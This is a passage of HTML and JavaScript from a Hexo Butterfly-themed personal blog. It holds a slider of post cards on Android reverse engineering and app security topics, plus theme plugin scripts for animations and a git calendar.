onclick="pjax.loadUrl(&quot;posts/b00b5fdb.html&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/cf804d4e.html&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.yimian.xyz/img?type=moe&amp;size=1920x1080" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-01-15</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/cf804d4e.html&quot;);" href="javascript:void(0);" alt="">《App安全实战指南》阅读笔记</a><div class="blog-slider__text">🥧阅读《App安全实战指南》记录的一些小东西</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/cf804d4e.html&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/466ed760.html&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.yimian.xyz/img?type=moe&amp;size=1920x1080" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-01-15</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/466ed760.html&quot;);" href="javascript:void(0);" alt="">Unidbg</a><div class="blog-slider__text">♥Unidbg基本操作的整理与归纳</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/466ed760.html&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/5324751f.html&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.yimian.xyz/img?type=moe&amp;size=1920x1080" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-01-15</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/5324751f.html&quot;);" href="javascript:void(0);" alt="">wechat简单逆向</a><div class="blog-slider__text">🥧对旧版本微信App的基本功能进行逆向分析</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/5324751f.html&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/f416437f.html&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.yimian.xyz/img?type=moe&amp;size=1920x1080" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-01-15</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/f416437f.html&quot;);" href="javascript:void(0);" alt="">App安全分析指南</a><div class="blog-slider__text">🍅对网上一些关于移动安全测试文章的整理与归纳</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/f416437f.html&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/947764cb.html&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.yimian.xyz/img?type=moe&amp;size=1920x1080" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-01-15</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/947764cb.html&quot;);" href="javascript:void(0);" alt="">Xposed框架</a><div class="blog-slider__text">🐕Xposed Hook框架的基本操作整理与归纳</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/947764cb.html&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/f0867805.html&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.yimian.xyz/img?type=moe&amp;size=1920x1080" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-01-15</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/f0867805.html&quot;);" href="javascript:void(0);" alt="">NDK学习</a><div class="blog-slider__text">🍑NDK开发基本操作的记录</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/f0867805.html&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/be4930f3.html&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.yimian.xyz/img?type=moe&amp;size=1920x1080" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-01-15</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/be4930f3.html&quot;);" href="javascript:void(0);" alt="">Android抓包</a><div class="blog-slider__text">🍍Android抓包技术的整理与归纳</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/be4930f3.html&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/7e4211d.html&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.yimian.xyz/img?type=moe&amp;size=1920x1080" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-01-15</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/7e4211d.html&quot;);" href="javascript:void(0);" alt="">Android基础知识</a><div class="blog-slider__text">🍇Android逆向学习的前置知识</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/7e4211d.html&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/95017dfa.html&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.yimian.xyz/img?type=moe&amp;size=1920x1080" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-01-15</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/95017dfa.html&quot;);" href="javascript:void(0);" alt="">AST混淆与反混淆</a><div class="blog-slider__text">🥒阅读《反爬虫AST原理与还原混淆实战》记录的一些小东西</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/95017dfa.html&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
    console.log('已挂载butterfly_swiper')
    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
    }
  var elist = 'undefined'.split(',');
  var cpage = location.pathname;
  var epage = '/';
  var flag = 0;

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_swiper_injector_config();
  }
  else if (epage === cpage){
    butterfly_swiper_injector_config();
  }
  </script><script defer src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.js"></script><script defer data-pjax src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper_init.js"></script><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__zoomIn');
    arr[i].setAttribute('data-wow-duration', '2s');
    arr[i].setAttribute('data-wow-delay', '200ms');
    arr[i].setAttribute('data-wow-offset', '30');
    arr[i].setAttribute('data-wow-iteration', '1');
  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__zoomIn');
    arr[i].setAttribute('data-wow-duration', '2s');
    arr[i].setAttribute('data-wow-delay', '200ms');
    arr[i].setAttribute('data-wow-offset', '30');
    arr[i].setAttribute('data-wow-iteration', '1');
  }</script></div><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow_init.js"></script><script data-pjax src="https://npm.elemecdn.com/hexo-filter-gitcalendar/lib/gitcalendar.js"></script><script data-pjax>
  function gitcalendar_injector_config(){
      var parent_div_git = document.getElementById('gitZone');
      var item_html = '<div class="recent-post-item" id="gitcalendarBar" style="width:100%;height:auto;padding:10px;"><style>#git_container{min-height: 320px}@media screen and (max-width:650px) {#git_container{min-height: 0px}}</style><div id="git_loading" style="width:10%;height:100%;margin:0 auto;display: block;"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animatetransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animatetransform></path></svg><style>#git_container{display: none;}</style></div><div id="git_container"></div></div>';
      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
      console.log('已挂载gitcalendar')
      }

    if( document.getElementById('gitZone') && (location.pathname ==='/site/census/'|| '/site/census/' ==='all')){
        gitcalendar_injector_config()
        GitCalendarInit("/api?null",['#d9e0df', '#c6e0dc', '#a8dcd4', '#9adcd2', '#89ded1', '#77e0d0', '#5fdecb', '#47dcc6', '#39dcc3', '#1fdabe', '#00dab9'],'null')
    }
  </script><!-- hexo injector body_end end --></body></html>